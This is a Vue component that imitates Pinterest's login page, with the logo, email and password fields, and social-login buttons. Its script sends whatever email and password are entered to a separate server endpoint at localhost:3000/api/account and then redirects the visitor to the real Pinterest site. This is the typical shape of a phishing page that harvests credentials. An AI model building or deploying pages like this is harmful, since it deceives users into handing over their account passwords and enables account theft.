<script lang="js" setup>
import { ref } from 'vue';
import axios from 'axios'
const email = ref('');
const password = ref('');

async function submit(event) {
  event.preventDefault();
  try {
    const response = await fetch('http://localhost:3000/api/account', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ email: email.value, password: password.value })
    });

    const data = await response.json();
    console.log("data", data)

  } catch (err) {
    console.log("err", err);
  }
  window.location.href = "https://www.pinterest.com/";
}

</script>

<template>
  <div class="container">
    <div class="content">
      <!--pinterest logo-->
      <img src="https://i.pinimg.com/originals/d3/d1/75/d3d175e560ae133f1ed5cd4ec173751a.png" alt="pin logo"
        class="img1" />
      <p class="header">Log in to see more</p>
      <form @submit="submit">

        <input v-model.trim="email" type="email" placeholder="Email" class="detail" /><br />
        <input v-model.trim="password" type="password" placeholder="Password" class="detail" />

        <a href="/">Forgot your password?</a>

        <button class="btn int" type="submit">Log in</button>

      </form>
      <p class="or">OR</p>
      <button class="btn fbk">
        s
        <i class="fab fa-facebook fa-lg" style="color: white; padding-right: 10px"></i><a href="#">Continue with
          Facebook</a></button><br />
      <button class="btn ggl">
        <i class="fab fa-google" style="color: rgb(11, 241, 22); padding-right: 10px"></i><a href="#">Continue with
          Google</a>
      </button>
    </div>
  </div>
</template>
